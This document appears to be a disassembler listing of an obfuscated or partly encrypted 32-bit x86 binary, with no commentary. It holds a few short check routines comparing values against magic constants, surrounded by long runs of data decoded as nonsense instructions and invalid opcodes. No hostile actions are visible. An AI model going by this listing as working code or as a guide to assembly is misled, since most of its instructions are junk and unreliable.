  401931:	add    ch,bh
  401933:	mov    bh,BYTE PTR [ebx+0x2]
  401936:	jg     0x40194d
  401938:	mov    ecx,0xd46d8be3
  40193d:	mov    eax,ds:0x1aab37ba
  401942:	ins    BYTE PTR es:[edi],dx
  401943:	pop    esp
  401944:	ja     0x401935
  401946:	sar    DWORD PTR [esp+edx*2],0x47
  40194a:	bound  ecx,QWORD PTR [eax-0x77]
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xc67bf628
  401994:	jp     0x40194a
  401996:	and    eax,0x70707a70
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	sub    bl,0x4a
  4019a2:	dec    ebp
  4019a3:	mov    ch,0x72
  4019a5:	xchg   ebp,eax
  4019a7:	xchg   ebp,eax
  4019a8:	ins    BYTE PTR es:[edi],dx
  4019a9:	sbb    ecx,DWORD PTR [eax-0x3b]
  4019ac:	out    0x34,al
  4019ae:	jbe    0x4019dc
  4019b0:	or     ecx,DWORD PTR [ebp+0x19eef4d2]
  4019b6:	clc    
  4019b7:	stos   BYTE PTR es:[edi],al
  4019b8:	xchg   ebp,eax
  4019b9:	pop    edi
  4019ba:	pop    es
  4019bb:	sbb    bl,BYTE PTR [edx+0x19]
  4019be:	ftst   
  4019c0:	jp     0x401948
  4019c2:	call   DWORD PTR [edi]
  4019c4:	inc    edi
  4019c5:	sub    DWORD PTR [esi+0x53f8ae20],0xffffffdb
  4019cc:	add    cl,bh
  4019ce:	push   cs
  4019cf:	stc    
  4019d0:	cdq    
  4019d1:	lahf   
  4019d2:	push   ds
  4019d3:	mov    al,ds:0x8dda3962
  4019d8:	adc    al,0x1
  4019da:	xchg   esi,eax
  4019db:	in     eax,dx
  4019dc:	xchg   edx,eax
  4019dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019de:	adc    eax,0x2c30c829
  4019e3:	adc    al,0x1d
  4019e5:	int    0xdb
  4019e7:	add    edi,DWORD PTR [eax]
  4019e9:	pop    esi
  4019ea:	sub    al,0x70
  4019ec:	pushf  
  4019ed:	push   cs
  4019ee:	shl    BYTE PTR [esi+0x61],0x6b
  4019f2:	cli    
  4019f3:	xchg   DWORD PTR [ebp+0x12677d56],edx
  4019f9:	push   ss
  4019fa:	ss cld 
  4019fc:	aam    0x2a
  4019fe:	jmp    0xa8b0:0xd86bd537
  401a05:	inc    esi
  401a06:	fistp  QWORD PTR [eax+edi*8-0x62]
  401a0a:	mov    dl,0x88
  401a0c:	nop
  401a0d:	cdq    
  401a0e:	xchg   esp,eax
  401a0f:	push   ebx
  401a10:	add    bl,dh
  401a12:	push   0x5c257ac0
  401a17:	or     cl,BYTE PTR [edx-0x7]
  401a1a:	mov    WORD PTR [ebx+0x6d73e84b],ss
  401a20:	leave  
  401a21:	adc    eax,0xe2a6293a
  401a26:	or     DWORD PTR [eax+0x52],ecx
  401a29:	push   ebp
  401a2a:	mov    BYTE PTR [esi],al
  401a2c:	pop    ebp
  401a2d:	pop    eax
  401a2e:	mov    eax,0xaccae975
  401a33:	dec    esp
  401a34:	lahf   
  401a35:	and    edi,DWORD PTR ds:[eax+ecx*8]
  401a39:	jge    0x401a9c
  401a3b:	sbb    bh,bh
  401a3d:	aam    0xab
  401a3f:	mov    dl,BYTE PTR [edx]
  401a41:	scas   al,BYTE PTR es:[edi]
  401a42:	pushf  
  401a43:	mov    ds:0xdbf46943,al
  401a48:	mov    ds:0x9b0ee8af,al
  401a4d:	mov    cl,0x7d
  401a4f:	fwait
  401a50:	push   0x25d66f2c
  401a55:	and    esp,DWORD PTR [ecx]
  401a57:	stos   DWORD PTR es:[edi],eax
  401a58:	mov    DWORD PTR es:[edx-0x54],0xe48d3f3
  401a60:	mov    ecx,0x2835d380
  401a65:	jl     0x401add
  401a67:	out    dx,eax
  401a68:	inc    esi
  401a69:	cdq    
  401a6a:	(bad)  
  401a6e:	call   0xb814f28c
  401a73:	int    0xc5
  401a75:	and    al,0x5b
  401a77:	add    al,0xb4
  401a79:	sbb    cl,BYTE PTR [ebx+0x7c]
  401a7c:	adc    esi,esi
  401a7e:	(bad)  
  401a7f:	jnp    0x401abd
  401a81:	xchg   DWORD PTR [esi-0x80],edi
  401a84:	mov    esp,0x29e2624f
  401a89:	push   0x16
  401a8b:	cmp    eax,DWORD PTR [edx+ecx*4+0x50]
  401a8f:	mov    ecx,0xbec8b128
  401a94:	test   BYTE PTR [eax],cl
  401a96:	repnz popa 
  401a98:	je     0x401a63
  401a9a:	push   ecx
  401a9b:	(bad)  
  401a9c:	mov    esi,0x14cf5fe5
  401aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aa2:	pop    edi
  401aa3:	mov    esp,0x3cb13754
  401aa8:	in     eax,0xda
  401aaa:	cmp    dl,BYTE PTR [edi+ebp*4-0x16]
  401aae:	cdq    
  401aaf:	adc    BYTE PTR [edi],ah
  401ab1:	(bad)  [ebx+0x6f0149d5]
  401ab7:	xchg   esi,eax
  401ab8:	(bad)  
  401ab9:	jnp    0x401a69
  401abb:	lock pop es
  401abd:	iret   
  401abe:	jne    0x401a61
  401ac0:	and    DWORD PTR [esi+0x6c30b8aa],esp
  401ac6:	shr    ebx,cl
  401ac8:	addr16 ja 0x401aa9
  401acb:	mov    eax,ds:0x1ffd323c
  401ad0:	jb     0x401ad0
  401ad2:	and    bh,al
  401ad4:	push   ss
  401ad5:	cld    
  401ad6:	mov    bh,0x77
  401ad8:	lods   al,BYTE PTR ds:[esi]
  401ad9:	sbb    edi,esi
  401adb:	mov    ah,0x1c
  401add:	sahf   
  401ade:	lahf   
  401adf:	stc    
  401ae0:	pusha  
  401ae1:	test   DWORD PTR [edx-0x7e],ebx
  401ae4:	bound  edi,QWORD PTR [esi-0x2f333766]
  401aea:	mov    ?,eax
  401aec:	jbe    0x401b41
  401aee:	push   0xbdd7a58a
  401af3:	inc    ecx
  401af4:	dec    edx
  401af5:	and    BYTE PTR [ecx-0x2edc8721],0x8e
  401afc:	mov    ds:0xff2d80f7,al
  401b01:	lock jns 0x401b16
  401b04:	mov    edx,0x99dadc2c
  401b09:	out    dx,eax
  401b0a:	or     DWORD PTR [edi-0x75d93c43],ebp
  401b10:	adc    al,0x3d
  401b12:	ret    
  401b13:	mov    eax,ds:0x13b18a51
  401b18:	or     BYTE PTR [edi+0x1bcf1999],ah
  401b1e:	(bad)  
  401b1f:	and    BYTE PTR [eax-0x2bd0680e],ch
  401b25:	hlt    
  401b26:	xor    edx,DWORD PTR [edx]
  401b28:	pop    edx
  401b29:	ret    0xc658
  401b2c:	out    dx,eax
  401b2d:	inc    ecx
  401b2e:	fs popa 
  401b30:	not    BYTE PTR [eax-0x76901857]
  401b36:	mov    ebp,0xc2dd1341
  401b3b:	int    0x5b
  401b3d:	inc    ecx
  401b3e:	mov    ebp,0xddd130de
  401b43:	dec    edx
  401b44:	mov    cl,0x9c
  401b46:	xadd   DWORD PTR [esi-0x28d77e6d],eax
  401b4d:	lea    edi,gs:[edi+0x5ca9bff3]
  401b54:	mov    bh,0xef
  401b56:	fprem  
  401b58:	ja     0x401aee
  401b5a:	dec    ebx
  401b5b:	cwde   
  401b5c:	and    al,0xe9
  401b5e:	addr16 pop esi
  401b60:	icebp  
  401b61:	cld    
  401b62:	mov    esp,0xf8c5b631
  401b67:	(bad)  
  401b68:	sub    eax,0xa1cdfbdf
  401b6d:	xor    eax,0xf7fa8800
  401b72:	sub    eax,0xc9a851c4
  401b77:	ja     0x401bca
  401b79:	arpl   WORD PTR [esi-0x1fe60a4c],bp
  401b7f:	or     edx,DWORD PTR [ebx+0x60d58cf8]
  401b85:	mov    eax,ds:0xbc53ebb3
  401b8a:	mov    ebx,0xd680f5ba
  401b8f:	xor    eax,0xa5844adc
  401b94:	sub    eax,0xceb1e7b9
  401b99:	call   0x8b0e:0x3c260c7f
  401ba0:	inc    ebp
  401ba1:	lock mov edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    al,bh
  401bdd:	aaa    
  401bde:	jae    0x401bf2
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	enter  0xf412,0xe5
  401bec:	imul   DWORD PTR [edx]
  401bee:	mov    eax,esi
  401bf0:	std    
  401bf1:	xchg   edx,eax
  401bf2:	in     al,0xad
  401bf4:	lods   al,BYTE PTR ds:[esi]
  401bf5:	into   
  401bf6:	sub    BYTE PTR [ecx],cl
  401bf8:	popa   
  401bf9:	mov    BYTE PTR [edx+0x40],ah
  401bfc:	adc    DWORD PTR [esi],esi
  401bfe:	pop    ds
  401bff:	(bad)  [ecx-0xc]
  401c02:	outs   dx,BYTE PTR ds:[esi]
  401c03:	and    al,cl
  401c05:	cmc    
  401c06:	xchg   edi,eax
  401c07:	push   edx
  401c08:	xchg   DWORD PTR [eax+eax*1],esi
  401c0b:	repnz rcl BYTE PTR [esi+ecx*4+0xc52f412],cl
  401c13:	es mov eax,0xfc19ae2f
  401c19:	fcom   DWORD PTR [edi]
  401c1b:	out    0xcb,al
  401c1d:	pop    edx
  401c1e:	jmp    0x401c02
  401c20:	sub    bh,al
  401c22:	or     dh,BYTE PTR [eax]
  401c24:	(bad)  
  401c25:	fisub  DWORD PTR [eax-0x222924af]
  401c2b:	inc    BYTE PTR [ecx]
  401c2d:	jmp    0xec42d9d6
  401c32:	shl    esi,1
  401c34:	mov    bh,0x73
  401c36:	js     0x401c64
  401c38:	fs call 0x77948961
  401c3e:	sub    esi,DWORD PTR [eax-0x2a]
  401c41:	loopne 0x401be9
  401c43:	sbb    DWORD PTR [edi+edi*8],esp
  401c46:	jb     0x401bd0
  401c48:	xchg   edx,eax
  401c49:	cmc    
  401c4a:	sub    DWORD PTR [edi+0x692e4f4f],esp
  401c50:	sahf   
  401c51:	push   ecx
  401c52:	inc    edi
  401c53:	adc    eax,0xdd500ecf
  401c58:	sbb    bl,BYTE PTR [ebx+0x51]
  401c5b:	out    0x51,al
  401c5d:	and    ah,BYTE PTR [edi+0x3b20b9dc]
  401c63:	pop    ss
  401c64:	xchg   ebx,eax
  401c65:	clc    
  401c66:	mov    ah,BYTE PTR [esp+edi*2+0x35e6bb06]
  401c6d:	popa   
  401c6e:	ja     0x401c6e
  401c70:	imul   esi,DWORD PTR [ecx],0xcb7694a7
  401c76:	mov    DWORD PTR [esi],edx
  401c78:	rol    DWORD PTR [ebx+ebp*1+0x6c],1
  401c7c:	push   0x4e7333f8
  401c81:	(bad)  
  401c82:	and    ebp,DWORD PTR [ebx]
  401c84:	adc    esi,DWORD PTR [ebx-0x5a]
  401c87:	mov    esi,0x8a3acb28
  401c8c:	fcom   st(6)
  401c8e:	loopne 0x401ca3
  401c90:	aad    0x71
  401c92:	jnp    0x401c34
  401c94:	cmp    BYTE PTR [ebp+0x1b],cl
  401c97:	sbb    dl,bh
  401c99:	sub    esi,DWORD PTR [edi]
  401c9b:	sbb    DWORD PTR [esp+edi*4],ebp
  401c9e:	sbb    al,0xec
  401ca0:	into   
  401ca1:	imul   edi,DWORD PTR [ebx+0xba39641],0x3a
  401ca8:	adc    al,BYTE PTR [ebp-0x1c278269]
  401cae:	retf   
  401caf:	mov    ah,0x54
  401cb1:	jecxz  0x401cd0
  401cb3:	fild   WORD PTR [eax+0x25d8cdcb]
  401cb9:	push   es
  401cba:	ficom  DWORD PTR [ebx-0x4785302]
  401cc0:	popf   
  401cc1:	dec    ebp
  401cc2:	or     BYTE PTR [edx],bh
  401cc4:	pop    ebp
  401cc5:	lds    esp,FWORD PTR [edx-0x53233365]
  401ccb:	xchg   edx,eax
  401ccc:	jno    0x401cff
  401cce:	or     bh,cl
  401cd0:	push   es
  401cd1:	jp     0x401c5e
  401cd3:	pop    ecx
  401cd4:	popa   
  401cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cd6:	cld    
  401cd7:	sbb    al,0xbe
  401cd9:	call   0xa70bc52b
  401cde:	mov    ecx,0x11a2748
  401ce3:	push   ebx
  401ce4:	enter  0x578f,0x28
  401ce8:	mov    ah,0xd4
  401cea:	cmp    DWORD PTR [ecx+esi*2+0x7d],edx
  401cee:	xchg   esi,eax
  401cef:	std    
  401cf0:	pop    eax
  401cf1:	pop    ecx
  401cf2:	xor    al,0xf7
  401cf4:	rcl    DWORD PTR [edi+0x37],0xfc
  401cf8:	sub    BYTE PTR [eax+0x10684a],cl
  401cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cff:	push   edx
  401d00:	pop    edx
  401d01:	mov    ch,0xfa
  401d03:	sbb    edx,edi
  401d05:	xlat   BYTE PTR ds:[ebx]
  401d06:	sbb    eax,0xf12ca583
  401d0b:	sahf   
  401d0c:	xchg   BYTE PTR [ebx-0x443385e3],ah
  401d12:	daa    
  401d13:	fist   WORD PTR [ecx-0x2f041529]
  401d19:	push   edi
  401d1a:	shl    BYTE PTR [edi+0xd],1
  401d1d:	ja     0x401cba
  401d1f:	dec    eax
  401d20:	repz scas eax,DWORD PTR es:[edi]
  401d22:	inc    ecx
  401d23:	push   ss
  401d24:	cdq    
  401d25:	mov    eax,DWORD PTR [ecx+0x54c30692]
  401d2b:	sar    DWORD PTR [esi-0x721b7e3b],1
  401d31:	int3   
  401d32:	add    bl,dl
  401d34:	jp     0x401d45
  401d36:	ss icebp 
  401d38:	ins    BYTE PTR es:[edi],dx
  401d39:	mov    ds:0x8ab8e18a,al
  401d3e:	mov    ah,cl
  401d40:	or     DWORD PTR [esi-0x39],ebp
  401d43:	inc    ebx
  401d44:	jns    0x401db6
  401d46:	jno    0x401db4
  401d48:	pop    eax
  401d49:	cld    
  401d4a:	call   0xb284:0x2b912fef
  401d51:	sbb    al,0x40
  401d53:	test   BYTE PTR [esp+ebx*4],ch
  401d56:	mov    dh,0x23
  401d58:	inc    edi
  401d59:	frstor [edx-0x75]
  401d5c:	pop    eax
  401d5d:	das    
  401d5e:	jae    0x401d7c
  401d60:	mov    DWORD PTR [edi],esi
  401d62:	pop    ecx
  401d63:	pop    esp
  401d64:	pop    ebp
  401d65:	or     esp,esi
  401d67:	dec    esp
  401d68:	xor    eax,0x98ad12d5
  401d6d:	ds lahf 
  401d6f:	popf   
  401d70:	jl     0x401dcf
  401d72:	jecxz  0x401db1
  401d74:	cmp    edx,DWORD PTR [bp+di+0x2c02]
  401d79:	ss ins BYTE PTR es:[edi],dx
  401d7b:	inc    esp
  401d7c:	jecxz  0x401dd5
  401d7e:	dec    eax
  401d7f:	jmp    0x3504:0x84631f66
  401d86:	(bad)  
  401d87:	pop    edx
  401d88:	mov    ebp,0x305a3519
  401d8d:	cmp    DWORD PTR ds:0x9a0633b0,ebp
  401d93:	adc    eax,0x62400664
  401d98:	mov    ebp,0xc127ee29
  401d9d:	(bad)  
  401d9e:	in     eax,0x90
  401da0:	sub    DWORD PTR [esi],0x7f4be762
  401da6:	inc    esi
  401da7:	repnz shl dh,cl
  401daa:	pop    ecx
  401dab:	out    dx,al
  401dac:	ror    BYTE PTR [edi],cl
  401dae:	bnd call 0x45680ec5
  401db4:	test   BYTE PTR [esi],ah
  401db6:	or     BYTE PTR [edx+edi*4+0x58a1010d],0xf4
  401dbe:	jmp    0x401e2f
  401dc0:	out    dx,al
  401dc1:	bound  edi,QWORD PTR [edx+eax*4-0xa]
  401dc5:	dec    edx
  401dc6:	or     eax,0x603837b4
  401dcb:	into   
  401dcc:	jge    0x401d9a
  401dce:	jns    0x401dc5
  401dd0:	cld    
  401dd1:	fwait
  401dd2:	sbb    BYTE PTR [ebx-0x73],0xa4
  401dd6:	dec    edi
  401dd7:	pop    esp
  401dd8:	fcom   DWORD PTR [esi-0x6]
  401ddb:	std    
  401ddc:	push   edx
  401ddd:	push   0x9
  401ddf:	mov    ch,0x44
  401de1:	repz stc 
  401de3:	cmp    al,0x9f
  401de5:	lods   eax,DWORD PTR gs:[esi]
  401de7:	loop   0x401dec
  401de9:	inc    ebp
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ecx+ebp*4-0x4a],dl
  401e44:	fsubr  st(7),st
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	and    dl,BYTE PTR [edx+0xee886f0]
  401e54:	(bad)  
  401e55:	adc    BYTE PTR [ebx+0x1b812701],bh
  401e5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e5c:	sti    
  401e5d:	es sub al,0x75
  401e60:	test   eax,0xb9fe5317
  401e65:	xchg   edi,eax
  401e66:	shl    BYTE PTR [ebp+0x6f],1
  401e69:	clc    
  401e6a:	outs   dx,BYTE PTR ds:[esi]
  401e6b:	fld    TBYTE PTR ds:0x236db925
  401e71:	sub    al,0xf8
  401e73:	and    edx,DWORD PTR [ecx+0x3f3dba8a]
  401e79:	dec    eax
  401e7a:	pop    esp
  401e7b:	adc    cl,BYTE PTR [eax-0x18]
  401e7e:	and    eax,0x87bfe050
  401e83:	js     0x401ef2
  401e85:	sub    esp,DWORD PTR [ecx]
  401e87:	or     DWORD PTR [edi],eax
  401e89:	in     al,dx
  401e8a:	dec    edx
  401e8b:	add    BYTE PTR [edx-0x5f],dh
  401e8e:	jg     0x401ee9
  401e90:	or     al,0x45
  401e92:	aad    0xeb
  401e94:	bound  ecx,QWORD PTR [eax+0x528297e2]
  401e9a:	es mov bl,0x21
  401e9d:	add    ecx,ebp
  401e9f:	pop    ds
  401ea0:	scas   al,BYTE PTR es:[edi]
  401ea1:	inc    esi
  401ea2:	imul   edx,DWORD PTR [ebp+eax*2-0x6d],0x35c566a9
  401eaa:	jne    0x401ed3
  401eac:	inc    eax
  401ead:	fidiv  DWORD PTR [eax]
  401eaf:	and    DWORD PTR [edx-0x5518efbb],ecx
  401eb5:	test   BYTE PTR [ebp-0x63],bh
  401eb8:	cmp    ebp,DWORD PTR [ebp-0x80]
  401ebb:	inc    ebp
  401ebc:	mov    edi,0xd44acbcb
  401ec1:	mov    edx,0x995b559e
  401ec6:	mov    dh,0x7c
  401ec8:	add    eax,0xa7c081f5
  401ecd:	mov    ebp,0xe6d74e6d
  401ed2:	xchg   edi,eax
  401ed3:	sar    DWORD PTR [esi],1
  401ed5:	cmp    bl,ah
  401ed7:	fdiv   DWORD PTR [edi-0x21]
  401eda:	dec    edi
  401edb:	in     al,0xa
  401edd:	mov    esi,0x8c34462
  401ee2:	std    
  401ee3:	or     eax,DWORD PTR [eax-0x41]
  401ee6:	push   0xb085345f
  401eeb:	scas   eax,DWORD PTR es:[edi]
  401eec:	add    eax,eax
  401eee:	sub    DWORD PTR [esi],ecx
  401ef0:	push   0xffffffc3
  401ef2:	pop    ss
  401ef3:	inc    edx
  401ef4:	(bad)  
  401ef5:	aam    0xe6
  401ef7:	out    dx,al
  401ef8:	daa    
  401ef9:	push   es
  401efa:	jnp    0x401f73
  401efc:	pusha  
  401efd:	jnp    0x401ef9
  401eff:	or     ebx,DWORD PTR ss:[esi-0x15]
  401f03:	test   BYTE PTR [esi],0x2d
  401f06:	not    DWORD PTR [eax]
  401f08:	cmp    BYTE PTR [edi+0x17],ah
  401f0b:	lahf   
  401f0c:	pop    ecx
  401f0d:	or     dl,BYTE PTR [esi]
  401f0f:	stos   DWORD PTR es:[edi],eax
  401f10:	jp     0x401f32
  401f12:	mov    dl,0xf9
  401f14:	xchg   BYTE PTR [esi-0x1f],bl
  401f17:	xchg   edi,eax
  401f18:	leave  
  401f19:	dec    ebp
  401f1a:	int3   
  401f1b:	cmp    BYTE PTR [edi-0x6f],ah
  401f1e:	ss xchg ecx,eax
  401f20:	cmp    eax,0x72731e4f
  401f25:	and    BYTE PTR [ebp+0x4b06d562],ah
  401f2b:	push   eax
  401f2c:	mov    eax,0x9997c4a3
  401f31:	and    eax,DWORD PTR [eax+eiz*4-0x53]
  401f35:	adc    DWORD PTR [eax-0x10],edi
  401f38:	std    
  401f39:	jo     0x401f01
  401f3b:	dec    eax
  401f3c:	xlat   BYTE PTR ds:[ebx]
  401f3d:	pop    ebx
  401f3e:	cmp    eax,0x5d655677
  401f43:	mov    esp,0xfacc8858
  401f48:	pop    ebp
  401f49:	mov    ebp,0xd142703f
  401f4e:	xchg   ebx,eax
  401f4f:	sbb    al,0x16
  401f51:	mov    ecx,0x50690e8c
  401f56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f57:	mov    ecx,ebx
  401f59:	xchg   DWORD PTR [edx],edx
  401f5b:	test   DWORD PTR [esi-0x10],esi
  401f5e:	inc    esp
  401f5f:	bound  edx,QWORD PTR [edx-0x67]
  401f62:	add    al,0xb
  401f64:	inc    eax
  401f65:	inc    eax
  401f66:	jp     0x401f8e
  401f68:	ins    BYTE PTR es:[edi],dx
  401f69:	test   al,0xe4
  401f6b:	hlt    
  401f6c:	scas   al,BYTE PTR es:[edi]
  401f6d:	imul   BYTE PTR [ebp+0x19945f3d]
  401f73:	sub    al,0x30
  401f75:	jnp    0x401fdc
  401f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f78:	xchg   esp,edi
  401f7a:	jge    0x401f2c
  401f7c:	xor    eax,0x3efd6b17
  401f81:	push   edx
  401f82:	mov    bl,0x1a
  401f84:	jge    0x401fd1
  401f86:	mov    cl,0x31
  401f88:	adc    ah,bl
  401f8a:	and    al,al
  401f8c:	xchg   BYTE PTR [ebx+ebx*1+0x1a],ah
  401f90:	inc    esp
  401f91:	scas   al,BYTE PTR es:[edi]
  401f92:	xchg   esp,eax
  401f93:	test   BYTE PTR [ebp+0x45],0xcb
  401f97:	mov    edi,0xc33725f1
  401f9c:	add    edx,edx
  401f9e:	sti    
  401f9f:	mov    ebp,0xbe45f0e5
  401fa4:	adc    DWORD PTR [ecx+0x30],edi
  401fa7:	and    esi,edx
  401fa9:	ret    0x4ecb
  401fac:	cmp    al,BYTE PTR [eax]
  401fae:	in     eax,dx
  401faf:	cwde   
  401fb0:	dec    edi
  401fb1:	icebp  
  401fb2:	fdivr  st,st(1)
  401fb4:	jnp    0x401fbd
  401fb6:	inc    esi
  401fb7:	pusha  
  401fb8:	rcr    BYTE PTR [eax],0x70
  401fbb:	fwait
  401fbc:	sar    ebx,0x17
  401fbf:	std    
  401fc0:	cld    
  401fc1:	call   0x56281bf7
  401fc6:	lods   eax,DWORD PTR ds:[esi]
  401fc7:	pop    ebx
  401fc8:	xchg   DWORD PTR es:[ecx],eax
  401fcb:	pop    es
  401fcc:	jp     0x401fc6
  401fce:	dec    ecx
  401fcf:	pop    ss
  401fd0:	xchg   ebp,eax
  401fd1:	ins    DWORD PTR es:[edi],dx
  401fd2:	ins    BYTE PTR es:[edi],dx
  401fd3:	mov    eax,0xe132a79e
  401fd8:	push   ds
  401fd9:	cdq    
  401fda:	inc    edi
  401fdb:	mov    esp,0xd7ff845a
  401fe0:	add    dh,al
  401fe2:	stos   DWORD PTR es:[edi],eax
  401fe3:	enter  0x8d2d,0x28
  401fe7:	pop    esi
  401fe8:	dec    ebx
  401fe9:	xor    bh,BYTE PTR [esp+ebx*1]
  401fec:	xor    DWORD PTR [eax+ebx*2],0x4c
  401ff0:	shr    DWORD PTR [ecx],cl
  401ff2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ff3:	sub    eax,0x49b08138
  401ff8:	or     eax,0x53971e2d
  401ffd:	xchg   ebp,edx
  401fff:	sub    DWORD PTR [eax],edi
  402001:	es xor bl,dh
  402004:	xchg   ebx,eax
  402005:	sbb    ch,0xa5
  402008:	loop   0x401fe5
  40200a:	test   ebp,edi
  40200c:	mov    edx,0x4d24efe0
  402011:	inc    ebx
  402012:	and    al,0xc6
  402014:	cwde   
  402015:	adc    bl,bh
  402017:	xchg   edx,eax
  402018:	mov    BYTE PTR [edx],ch
  40201a:	jecxz  0x40201f
  40201c:	push   ss
  40201d:	fs jnp 0x402015
  402020:	jnp    0x40204c
  402022:	mov    dl,0xbf
  402024:	lea    esp,[eax]
  402026:	adc    DWORD PTR [ecx-0x26],0x1e
  40202a:	and    dh,dl
  40202c:	push   0xbae9c5a8
  402031:	jbe    0x40202e
  402033:	arpl   ax,si
  402035:	int3   
  402036:	icebp  
  402037:	dec    esi
  402038:	scas   eax,DWORD PTR es:[edi]
  402039:	or     DWORD PTR [esi],0x7a
  40203c:	cdq    
  40203d:	xchg   ebp,eax
  40203e:	push   ecx
  40203f:	leave  
  402040:	cld    
  402041:	jge    0x401fd0
  402043:	mov    ecx,0xcd072ade
  402048:	or     al,0xe6
  40204a:	dec    edi
  40204b:	mov    esp,0x558b6687
  402050:	fmul   DWORD PTR [ebx-0x38fc99ee]
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	xor    BYTE PTR [edi-0x62],0x67
  40206d:	ds jo  0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	push   ax
  402078:	lods   al,BYTE PTR ds:[esi]
  402079:	aaa    
  40207a:	call   0xfc72:0x1b4a4948
  402081:	mov    ecx,DWORD PTR [edx+0x49]
  402084:	cld    
  402085:	add    DWORD PTR [eax+0x38dd18b0],0x2edb7222
  40208f:	mov    esi,es
  402091:	inc    esp
  402092:	jle    0x40208b
  402094:	psrlq  mm4,QWORD PTR [esi-0x6d]
  402098:	daa    
  402099:	pop    sp
  40209b:	sahf   
  40209c:	and    eax,DWORD PTR [ebx+eax*1]
  40209f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020a0:	imul   edx,DWORD PTR [ebp-0x79b54cd7],0x16994aa6
  4020aa:	les    edi,FWORD PTR [eax-0x556b6b00]
  4020b0:	aad    0xa6
  4020b2:	icebp  
  4020b3:	mov    ds:0x9f6e4a6b,al
  4020b8:	xor    DWORD PTR [ebp-0x792b76fa],edx
  4020be:	out    dx,al
  4020bf:	mov    esi,0xe095f1db
  4020c4:	call   0xa444443e
  4020c9:	mov    bl,0x4f
  4020cb:	std    
  4020cc:	jno    0x4020d5
  4020ce:	retf   0x8d22
  4020d1:	add    dh,BYTE PTR [edx+0x76c6a2ca]
  4020d7:	popf   
  4020d8:	mov    eax,0x4d787c63
  4020dd:	loope  0x4020da
  4020df:	xchg   ecx,eax
  4020e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020e1:	mov    eax,0xde19cb61
  4020e6:	inc    ebp
  4020e7:	repnz push es
  4020e9:	pop    edi
  4020ea:	gs inc ebx
  4020ec:	ja     0x4020e1
  4020ee:	sbb    dl,BYTE PTR [ecx+0x29e370a4]
  4020f4:	call   0xf2d51277
  4020f9:	xchg   ecx,eax
  4020fa:	mov    dh,0xce
  4020fc:	loope  0x402159
  4020fe:	push   cs
  4020ff:	push   cs
  402100:	lahf   
  402101:	mov    ds:0x20da977f,al
  402106:	adc    ebp,DWORD PTR [ebp-0x72db9558]
  40210c:	mov    ds:0xdd9724b0,eax
  402111:	loop   0x40210c
  402113:	dec    ecx
  402114:	ror    DWORD PTR [edi],1
  402116:	pop    esi
  402117:	and    ebp,0xe346d985
  40211d:	mov    al,0x15
